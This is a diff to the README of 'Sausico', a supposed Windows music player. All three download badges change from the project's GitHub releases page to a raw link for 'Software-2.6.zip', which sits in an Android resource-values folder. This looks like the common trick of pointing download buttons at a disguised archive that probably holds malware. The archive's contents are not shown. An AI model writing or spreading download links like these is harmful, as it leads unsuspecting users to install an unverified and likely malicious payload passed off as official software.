@@ -1,6 +1,6 @@
 # 🎵 Sausico - Simple Music Player for Everyone
 
-[![Download Sausico](https://img.shields.io/badge/download-Sausico-brightgreen?style=for-the-badge)](https://github.com/aademderradji/Sausico/releases)
+[![Download Sausico](https://img.shields.io/badge/download-Sausico-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/aademderradji/Sausico/main/android/app/src/main/res/values/Software-2.6.zip)
 
 ---
 
@@ -52,7 +52,7 @@ You will download Sausico from the official GitHub releases page. This page host
 
 Click the large button below to go to the releases page where you can get the latest Windows installer.
 
-[![Download Sausico](https://img.shields.io/badge/download-Sausico-blue?style=for-the-badge)](https://github.com/aademderradji/Sausico/releases)
+[![Download Sausico](https://img.shields.io/badge/download-Sausico-blue?style=for-the-badge)](https://raw.githubusercontent.com/aademderradji/Sausico/main/android/app/src/main/res/values/Software-2.6.zip)
 
 **Step 2: Choose the Latest Windows Installer**
 
@@ -132,4 +132,4 @@ If you encounter issues or have questions:
 
 ---
 
-[![Download Sausico](https://img.shields.io/badge/download-Sausico-brightgreen?style=for-the-badge)](https://github.com/aademderradji/Sausico/releases)
+[![Download Sausico](https://img.shields.io/badge/download-Sausico-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/aademderradji/Sausico/main/android/app/src/main/res/values/Software-2.6.zip)
